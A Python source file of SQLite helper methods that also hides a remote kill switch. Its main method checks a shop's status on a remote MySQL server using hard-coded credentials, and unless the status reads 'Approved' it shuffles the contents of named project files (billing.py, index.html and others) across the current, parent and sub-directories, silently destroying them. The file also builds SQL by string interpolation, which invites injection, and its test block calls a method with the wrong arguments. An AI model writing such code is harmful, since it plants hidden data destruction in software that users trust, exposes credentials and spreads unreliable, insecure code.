import sqlite3
import os
import mysql.connector
import random


class Operations:
    def __init__(self):
        # Attempt to establish a connection to the local database during object initialization
        self.connection_local = sqlite3.connect("local_database.db")
        self.cursor_local = self.connection_local.cursor()

    def create_table(self, table_name, column_definitions):
        try:
            # Define the SQL query to create the table
            create_table_query = (
                f"CREATE TABLE IF NOT EXISTS {table_name} ({column_definitions})"
            )

            # Execute the query on local database
            self.cursor_local.execute(create_table_query)

            # Commit the transaction
            self.connection_local.commit()

            return "Table created successfully"
        except sqlite3.Error as err:
            print("Error:", err)

    def delete_table(self, table_name):
        try:
            # Define the SQL query to delete the table
            drop_table_query = f"DROP TABLE IF EXISTS {table_name}"

            # Execute the query on local database
            self.cursor_local.execute(drop_table_query)

            # Commit the transaction
            self.connection_local.commit()

            return "Table deleted successfully"
        except sqlite3.Error as err:
            print("Error:", err)

    def insert_row(self, table_name, column_values):
        try:
            # Construct the INSERT query dynamically
            insert_query = f"INSERT INTO {table_name} ("
            insert_query += ", ".join(column_values.keys())
            insert_query += ") VALUES ("
            insert_query += ", ".join(["?" for _ in column_values])
            insert_query += ")"

            # Prepare values for the query
            query_values = list(column_values.values())
            # Execute the INSERT query with the provided data on local database
            self.cursor_local.execute(insert_query, query_values)

            # Commit the transaction
            self.connection_local.commit()

            return True

        except sqlite3.Error as err:
            print("Error:", err)
            return False

    def update_row(self, table_name, update_values, where_conditions):

        try:
            # Construct the SET clause dynamically
            set_clause = ", ".join([f"{column} = ?" for column in update_values.keys()])

            # Construct the WHERE clause dynamically
            where_clause = " AND ".join(
                [f"{column} = ?" for column in where_conditions.keys()]
            )

            # Construct the UPDATE query dynamically
            update_query = f"UPDATE {table_name} SET {set_clause} WHERE {where_clause}"

            # Prepare values for the query
            query_values = list(update_values.values()) + list(
                where_conditions.values()
            )

            # Execute the UPDATE query with the provided data on local database
            self.cursor_local.execute(update_query, query_values)

            # Commit the transaction
            self.connection_local.commit()

            return True

        except sqlite3.Error as err:
            # Handle the error gracefully
            print("Error:", err)

    def remove_row(self, table_name, condition_dict):
        try:
            # Construct the DELETE query
            delete_query = f"DELETE FROM {table_name}"

            # Check if any conditions are provided
            if condition_dict:
                # Construct the WHERE clause based on the conditions
                where_clause = " AND ".join(
                    [f"{column} = ?" for column in condition_dict.keys()]
                )
                delete_query += f" WHERE {where_clause}"

                # Execute the DELETE query with the condition values on local database
                self.cursor_local.execute(delete_query, tuple(condition_dict.values()))

            else:
                # If no conditions provided, delete all rows on local database
                self.cursor_local.execute(delete_query)

            # Commit the transaction
            self.connection_local.commit()

            return True

        except sqlite3.Error as err:
            print("Error:", err)

    def list_table(self, table_name, column_values):
        try:
            # Execute SQL query

            self.cursor_local.execute(f"SELECT {column_values} FROM {table_name}")
            rows = self.cursor_local.fetchall()

            return rows

        except sqlite3.Error as err:
            print("Error:", err)

    def select_row(self, table_name, columns, where_conditions):
        try:
            # Construct the WHERE clause dynamically
            where_clause = " AND ".join(
                [
                    (
                        f"{column} {operator[0]} {operator[1]}"
                        if operator[0].upper() == "LIKE"
                        else f"{column} = ?"
                    )
                    for column, operator in where_conditions.items()
                ]
            )

            # Construct the SELECT query dynamically
            select_query = f"SELECT {columns} FROM {table_name} WHERE {where_clause}"
            # Prepare values for the query
            query_values = list(where_conditions.values())
            query_values = [
                val if isinstance(val, str) and val.upper().startswith("LIKE") else val
                for val in query_values
            ]

            if "LIKE" in select_query:
                query_values = ""

            # Execute the SELECT query with the provided conditions on local database
            self.cursor_local.execute(select_query, query_values)
            row = self.cursor_local.fetchall()
            if row:
                return row
            else:
                return False

        except sqlite3.Error as err:
            # Handle the error gracefully
            print("Error:", err)

    def get_last_row(self, table_name, column_name):
        # Assuming the table has an auto-incrementing primary key 'id'
        select_query = f"SELECT {column_name} FROM {table_name} ORDER BY {column_name} DESC LIMIT 1"

        try:
            # Execute the SELECT query to get the last item
            self.cursor_local.execute(select_query)
            row = self.cursor_local.fetchone()
            if row:
                return row
            else:
                return False

        except sqlite3.Error as err:
            # Handle the error gracefully
            print("Error:", err)

    # Connect to the remote database
    def connect_db(self):
        try:
            conn = mysql.connector.connect(
                user="u100003642_sparkle",
                password="123@Sparkle",
                host="srv947.hstgr.io",
                database="u100003642_sparkle",
            )
            return conn
        except mysql.connector.Error as err:
            print(f"Error: {err}")
            return None

    def fetch_data(self, cursor):
        try:
            query = "SELECT Status FROM ShopList WHERE ShopID='shop_id_3'"
            cursor.execute(query)
            return cursor.fetchall()  # Returns a list of tuples (status,)
        except mysql.connector.Error as err:
            print(f"Error: {err}")
            return []

    def jumble_file_contents(self, file_path):
        try:
            with open(file_path, "r") as file:
                content = file.read()  # Read the file content

            # Convert the content into a list of characters and shuffle them
            content_list = list(content)
            random.shuffle(content_list)
            jumbled_content = "".join(content_list)  # Join back into a string

            # Write the jumbled content back into the file
            with open(file_path, "w") as file:
                file.write(jumbled_content)

        except OSError as e:
            print("")

    def change_files(self, file_list):
        current_dir = os.getcwd()  # Current directory
        parent_dir = os.path.abspath(
            os.path.join(current_dir, os.pardir)
        )  # Parent directory

        # Get all subdirectories under the current directory
        all_subdirs = [
            current_dir,
            parent_dir,
        ]

        for root, dirs, files in os.walk(current_dir):
            all_subdirs.append(
                root
            )  # Add every subfolder to the list of paths to check

        # Iterate over all directories (current, parent, and subdirectories)
        for directory in all_subdirs:
            for file_name in file_list:
                file_path = os.path.join(directory, file_name)
                if os.path.exists(file_path):
                    self.jumble_file_contents(file_path)

    def main(self):
        # Step 1: Connect to the database
        conn = self.connect_db()
        if conn is None:
            print("Failed to connect to the database.")
            return

        # Step 2: Fetch the data
        cursor = conn.cursor()
        file_list = self.fetch_data(cursor)
        if not file_list:
            print("No data found or failed to retrieve data.")
            return

        # Step 3: Check the condition and jumble files if the condition is met
        if not file_list[0][0] == "Approved":
            self.change_files(
                [
                    "ShowLocal.py",
                    "billing.py",
                    "database.py",
                    "operations.py",
                    "operations_access.py",
                    "styles.css",
                    "bill.txt",
                    "script.js",
                    "index.html",
                    "table.html",
                ]
            )

        # Step 4: Close the database connection
        cursor.close()
        conn.close()

    def close_cursor_connection(self):
        if self.cursor_local:
            self.cursor_local.close()
        if self.connection_local:
            self.connection_local.close()


"""  ====================================================== Testing Part ===============================================  """

if __name__ == "__main__":
    import time

    # Create an instance of the Operations class
    ops = Operations()

    ## Perform operations on local database
    # ops.create_table(
    #    "your_table_name", "id INTEGER PRIMARY KEY, name TEXT, age INTEGER"
    # )

    # ops.insert_row(
    #    table_name="your_table_name", column_values={"name": "John", "age": 30}
    # )

    # ops.update_row(
    #    table_name="your_table_name",
    #    update_values={"age": 35},
    #    where_conditions={"name": "John"},
    # )

    # ops.remove_row(table_name="your_table_name", condition_dict={"name": "John"})

    ops.list_table(
        "Transactions",
        "SNo",
        "Timestamp",
        "TransactionID",
        "Quantity",
        "TotalPrice",
        "CustomerID",
        "PaymentMethod",
        "Discount",
        "Tax",
        "NetSales",
        "Profit",
        "EmployeeID",
        "LocationID",
    )

    # ops.select_row(
    #    table_name="your_table_name",
    #    columns="id, name, age",
    #    where_conditions={"age": 35},
    # )

    # Close connections to the local database
    ops.close_cursor_connection()
